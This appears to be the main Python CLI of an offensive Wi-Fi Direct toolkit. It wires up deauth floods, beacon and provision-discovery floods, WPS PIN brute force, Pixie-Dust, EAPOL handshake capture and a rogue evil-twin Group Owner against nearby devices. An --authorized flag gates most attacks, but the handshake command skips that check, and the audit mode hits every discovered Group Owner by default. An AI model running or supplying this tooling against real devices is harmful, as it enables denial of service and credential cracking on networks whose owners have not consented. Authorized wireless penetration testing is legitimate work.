#!/usr/bin/env python3
"""DIRECTAX. Wi-Fi Direct (P2P) offensive research toolkit.

Subcommands:
  discover     Passive P2P device discovery (no injection)
  sniff        Full P2P + WSC + EAPOL capture (no injection)
  deauth       Deauth flood a P2P GO's clients
  beacon-flood Inject synthetic P2P GO beacons
  pd-flood     Provision Discovery flood a target device
  pbc-race     WPS PBC race attack against a GO in walk-time
  wps-pin      WPS External Registrar PIN brute
  pixie        WPS Pixie-Dust
  handshake    Capture EAPOL 4-way from P2P group
  rogue-go     Stand up a rogue Group Owner (evil-twin)
  audit        Discover targets, then run every safe active check with confirmation
  novelty-check Run only the known-issue gate on an existing findings JSON
"""
from __future__ import annotations

import argparse
import json
import os
import sys
import time

# Support running from repo root without install
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "src"))

from wifidirect_pentest.banner import print_banner  # noqa: E402
from wifidirect_pentest.core import Interface, get_logger  # noqa: E402
from wifidirect_pentest.core.interface import preflight, unblock_rfkill  # noqa: E402
from wifidirect_pentest.core.finding import (Confidence, Confirmation,  # noqa: E402
                                             Finding, Location, load_findings)
from wifidirect_pentest.core import finding_builders as fb  # noqa: E402
from wifidirect_pentest.scanners import Discovery, inspect_wps  # noqa: E402
from wifidirect_pentest.sniffers import P2PSniffer, EAPOLSniffer  # noqa: E402
from wifidirect_pentest.attacks import (BeaconFlood, DeauthFlood,  # noqa: E402
                                        HandshakeCapture, PBCRace, PixieDust,
                                        ProvisionFlood, RogueGO, WPSPinBrute)
from wifidirect_pentest.reporting import (NoveltyGate, print_human_summary,  # noqa: E402
                                          write_run)

log = get_logger("wfdx.main")


def _require_root() -> None:
    if os.geteuid() != 0:
        print("wfdx requires root (raw sockets + iface control).", file=sys.stderr)
        sys.exit(2)


def _open_monitor(iface: str) -> tuple[Interface, str]:
    ifc = Interface.open(iface)
    if not ifc.supports_monitor():
        raise SystemExit(f"driver on {iface} does not report monitor-mode capability")
    unblock_rfkill()
    mon = ifc.to_monitor()
    return ifc, mon


def cmd_discover(args) -> int:
    _require_root()
    ifc, mon = _open_monitor(args.iface)
    try:
        disc = Discovery(mon, dwell_ms=args.dwell)
        devices = disc.run(duration=args.duration)
    finally:
        ifc.restore()
    result = {"devices": {mac: d.as_dict() for mac, d in devices.items()}}
    if args.output:
        with open(args.output, "w") as f:
            json.dump(result, f, indent=2, default=str)
    print(f"discovered {len(devices)} P2P devices")
    for mac, d in devices.items():
        wps = inspect_wps(d)
        print(f"  {mac:17}  role={d.role:4}  ssid={sorted(d.ssids)}  "
              f"ch={sorted(d.channels_seen)}  wps={wps.wps_present}  "
              f"pbc={wps.pbc_supported}  pin={wps.pin_supported}  "
              f"locked={wps.ap_setup_locked}")
    return 0


def cmd_sniff(args) -> int:
    _require_root()
    ifc, mon = _open_monitor(args.iface)
    try:
        p2p = P2PSniffer(mon, out_pcap=args.p2p_pcap)
        r = p2p.run(duration=args.duration)
        e = EAPOLSniffer(mon, out_pcap=args.eapol_pcap)
        e_r = e.run(duration=args.duration, bssid_filter=args.bssid)
    finally:
        ifc.restore()
    print("P2P frames:", r)
    print("EAPOL frames:", e_r)
    return 0


def _finding_or_hypothesis(f: Finding | None, hypothesis_title: str,
                           target: str, why: str) -> Finding:
    if f is not None:
        return f
    return Finding(
        title=hypothesis_title, cwe="CWE-noise",
        confidence=Confidence.HYPOTHESIS,
        target=target, attacker_position="same-LAN",
        location=Location("<unknown>", inferred=True),
        data_flow=why, trigger="see confirmation script",
        confirmation=None, evidence="no confirmation captured",
        exploit_chain="not confirmed", observable="none",
        cvss_v40_score=None, cvss_v40_vector=None,
        fix="n/a - not confirmed",
    )


def cmd_deauth(args) -> int:
    _require_root()
    if not args.authorized:
        raise SystemExit("--authorized required for active attack")
    ifc, mon = _open_monitor(args.iface)
    try:
        d = DeauthFlood(mon, args.go, args.client, count=args.count,
                        evidence_dir=args.evidence_dir)
        r = d.run(duration=args.duration)
    finally:
        ifc.restore()
    finding = fb.build_deauth_finding(args.go, r)
    _emit([finding] if finding else [], args)
    return 0 if r.get("confirmed") else 1


def cmd_beacon_flood(args) -> int:
    _require_root()
    if not args.authorized:
        raise SystemExit("--authorized required for active attack")
    ifc, mon = _open_monitor(args.iface)
    try:
        b = BeaconFlood(mon, count=args.count, channel=args.channel,
                        name_prefix=args.name_prefix)
        r = b.run(duration=args.duration)
    finally:
        ifc.restore()
    print(json.dumps(r, indent=2))
    return 0


def cmd_pd_flood(args) -> int:
    _require_root()
    if not args.authorized:
        raise SystemExit("--authorized required for active attack")
    ifc, mon = _open_monitor(args.iface)
    try:
        p = ProvisionFlood(mon, args.target, count=args.count)
        r = p.run()
    finally:
        ifc.restore()
    print(json.dumps(r, indent=2))
    return 0


def cmd_pbc_race(args) -> int:
    _require_root()
    if not args.authorized:
        raise SystemExit("--authorized required for active attack")
    p = PBCRace(args.iface, args.target, walk_time=args.walk_time)
    r = p.run()
    finding = fb.build_pbc_race_finding(args.target, r)
    _emit([finding] if finding else [], args)
    return 0 if finding else 1


def cmd_wps_pin(args) -> int:
    _require_root()
    if not args.authorized:
        raise SystemExit("--authorized required for active attack")
    ifc, mon = _open_monitor(args.iface)
    try:
        b = WPSPinBrute(mon, args.go, args.channel, evidence_dir=args.evidence_dir)
        r = b.run(session_time=args.session_time)
    finally:
        ifc.restore()
    finding = fb.build_wps_pin_finding(args.go, r)
    _emit([finding] if finding else [], args)
    return 0 if finding else 1


def cmd_pixie(args) -> int:
    _require_root()
    if not args.authorized:
        raise SystemExit("--authorized required for active attack")
    ifc, mon = _open_monitor(args.iface)
    try:
        p = PixieDust(mon, args.go, args.channel, evidence_dir=args.evidence_dir)
        r = p.run(timeout=args.timeout)
    finally:
        ifc.restore()
    finding = fb.build_pixie_finding(args.go, r)
    _emit([finding] if finding else [], args)
    return 0 if finding else 1


def cmd_handshake(args) -> int:
    _require_root()
    ifc, mon = _open_monitor(args.iface)
    try:
        h = HandshakeCapture(mon, args.go, args.channel,
                             evidence_dir=args.evidence_dir)
        r = h.run(duration=args.duration)
    finally:
        ifc.restore()
    finding = fb.build_handshake_finding(args.go, r)
    _emit([finding] if finding else [], args)
    return 0 if r.get("confirmed") else 1


def cmd_rogue_go(args) -> int:
    _require_root()
    if not args.authorized:
        raise SystemExit("--authorized required for active attack")
    r = RogueGO(args.iface, args.ssid, args.bssid, args.channel,
                device_name=args.device_name, psk=args.psk,
                evidence_dir=args.evidence_dir)
    logs = r.start()
    try:
        time.sleep(args.duration)
    finally:
        collected = r.stop_and_collect()
    confirmed = r.confirm_from_logs(collected)
    finding = fb.build_rogue_go_finding(args.ssid, args.bssid, collected, confirmed)
    _emit([finding] if finding else [], args)
    return 0 if confirmed else 1


def cmd_audit(args) -> int:
    _require_root()
    if not args.authorized:
        raise SystemExit("--authorized required for active attack")
    ifc, mon = _open_monitor(args.iface)
    findings: list[Finding] = []
    try:
        disc = Discovery(mon, dwell_ms=500)
        devs = disc.run(duration=args.discovery_time)
        targets = [d for d in devs.values() if d.role == "GO"]
        if args.target_mac:
            targets = [d for d in devs.values()
                       if args.target_mac.lower() in
                       {d.device_addr, *d.interface_addrs, *d.bssids}]
        log.info("audit: %d GO target(s)", len(targets))
        for d in targets:
            bssid = next(iter(d.bssids), d.device_addr)
            ch = min(d.channels_seen) if d.channels_seen else 6
            wps = inspect_wps(d)

            # deauth + handshake capture
            deauth = DeauthFlood(mon, bssid, evidence_dir=args.evidence_dir)
            dr = deauth.run(duration=5.0)
            finding = fb.build_deauth_finding(bssid, dr)
            if finding:
                findings.append(finding)
            hs = HandshakeCapture(mon, bssid, ch, evidence_dir=args.evidence_dir)
            hres = hs.run(duration=20.0)
            f2 = fb.build_handshake_finding(bssid, hres)
            if f2:
                findings.append(f2)

            # pixie (only if WPS present)
            if wps.wps_present:
                px = PixieDust(mon, bssid, ch, evidence_dir=args.evidence_dir)
                pr = px.run(timeout=90.0)
                f3 = fb.build_pixie_finding(bssid, pr)
                if f3:
                    findings.append(f3)
    finally:
        ifc.restore()
    findings = NoveltyGate().apply(findings)
    _emit(findings, args)
    return 0 if findings else 1


def cmd_novelty_check(args) -> int:
    findings = load_findings(args.input)
    findings = NoveltyGate().apply(findings)
    if args.output:
        write_run(args.output, findings, {"mode": "novelty-check"})
    for f in findings:
        marker = f.novelty.known_cve or "novel"
        print(f"{f.id}  {f.title}  ->  {marker}")
    return 0


def _emit(findings: list[Finding], args) -> None:
    if args.output:
        write_run(args.output, findings, {"cli": " ".join(sys.argv)})
        print(f"wrote {args.output}")
    print_human_summary(findings, show_hypothesis=getattr(args, "show_hypothesis", False))


def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(prog="directax", description=__doc__,
                                formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument("--verbose", action="store_true")
    p.add_argument("--output", help="write JSON findings to path")
    p.add_argument("--show-hypothesis", action="store_true",
                   help="include LIKELY/HYPOTHESIS entries in human output")
    p.add_argument("--evidence-dir", default="evidence")
    p.add_argument("--preflight", action="store_true",
                   help="check required external tools and exit")

    sub = p.add_subparsers(dest="cmd")

    d = sub.add_parser("discover")
    d.add_argument("-i", "--iface", required=True)
    d.add_argument("--duration", type=float, default=60.0)
    d.add_argument("--dwell", type=int, default=500, help="ms per social channel")
    d.set_defaults(func=cmd_discover)

    s = sub.add_parser("sniff")
    s.add_argument("-i", "--iface", required=True)
    s.add_argument("--duration", type=float, default=60.0)
    s.add_argument("--p2p-pcap", default="evidence/p2p.pcap")
    s.add_argument("--eapol-pcap", default="evidence/eapol.pcap")
    s.add_argument("--bssid", default=None)
    s.set_defaults(func=cmd_sniff)

    de = sub.add_parser("deauth")
    de.add_argument("-i", "--iface", required=True)
    de.add_argument("--go", required=True, help="target GO BSSID")
    de.add_argument("--client", default="ff:ff:ff:ff:ff:ff")
    de.add_argument("--count", type=int, default=128)
    de.add_argument("--duration", type=float, default=5.0)
    de.add_argument("--authorized", action="store_true")
    de.set_defaults(func=cmd_deauth)

    bf = sub.add_parser("beacon-flood")
    bf.add_argument("-i", "--iface", required=True)
    bf.add_argument("--count", type=int, default=30)
    bf.add_argument("--channel", type=int, default=6)
    bf.add_argument("--duration", type=float, default=15.0)
    bf.add_argument("--name-prefix", default="Fake")
    bf.add_argument("--authorized", action="store_true")
    bf.set_defaults(func=cmd_beacon_flood)

    pf = sub.add_parser("pd-flood")
    pf.add_argument("-i", "--iface", required=True)
    pf.add_argument("--target", required=True)
    pf.add_argument("--count", type=int, default=500)
    pf.add_argument("--authorized", action="store_true")
    pf.set_defaults(func=cmd_pd_flood)

    pb = sub.add_parser("pbc-race")
    pb.add_argument("-i", "--iface", required=True, help="managed iface (wpa_supplicant)")
    pb.add_argument("--target", required=True)
    pb.add_argument("--walk-time", type=float, default=30.0)
    pb.add_argument("--authorized", action="store_true")
    pb.set_defaults(func=cmd_pbc_race)

    wp = sub.add_parser("wps-pin")
    wp.add_argument("-i", "--iface", required=True)
    wp.add_argument("--go", required=True)
    wp.add_argument("--channel", type=int, required=True)
    wp.add_argument("--session-time", type=float, default=600.0)
    wp.add_argument("--authorized", action="store_true")
    wp.set_defaults(func=cmd_wps_pin)

    px = sub.add_parser("pixie")
    px.add_argument("-i", "--iface", required=True)
    px.add_argument("--go", required=True)
    px.add_argument("--channel", type=int, required=True)
    px.add_argument("--timeout", type=float, default=120.0)
    px.add_argument("--authorized", action="store_true")
    px.set_defaults(func=cmd_pixie)

    hs = sub.add_parser("handshake")
    hs.add_argument("-i", "--iface", required=True)
    hs.add_argument("--go", required=True)
    hs.add_argument("--channel", type=int, required=True)
    hs.add_argument("--duration", type=float, default=30.0)
    hs.set_defaults(func=cmd_handshake)

    rg = sub.add_parser("rogue-go")
    rg.add_argument("-i", "--iface", required=True)
    rg.add_argument("--ssid", required=True)
    rg.add_argument("--bssid", required=True)
    rg.add_argument("--channel", type=int, required=True)
    rg.add_argument("--device-name", default="wfdx-clone")
    rg.add_argument("--psk", default="wfdx-lab-only-1234")
    rg.add_argument("--duration", type=float, default=120.0)
    rg.add_argument("--authorized", action="store_true")
    rg.set_defaults(func=cmd_rogue_go)

    au = sub.add_parser("audit")
    au.add_argument("-i", "--iface", required=True)
    au.add_argument("--discovery-time", type=float, default=45.0)
    au.add_argument("--target-mac", default=None)
    au.add_argument("--authorized", action="store_true")
    au.set_defaults(func=cmd_audit)

    nc = sub.add_parser("novelty-check")
    nc.add_argument("--input", required=True)
    nc.set_defaults(func=cmd_novelty_check)

    return p


def main() -> int:
    parser = build_parser()
    args = parser.parse_args()
    if not os.environ.get("DIRECTAX_NO_BANNER"):
        print_banner()
    if args.verbose:
        os.environ["WFDX_LOGLEVEL"] = "DEBUG"
    if args.preflight:
        missing = preflight()
        if missing:
            print("missing:", ", ".join(missing))
            return 1
        print("all required tools present")
        return 0
    if not getattr(args, "func", None):
        parser.print_help()
        return 2
    return args.func(args)


if __name__ == "__main__":
    sys.exit(main())
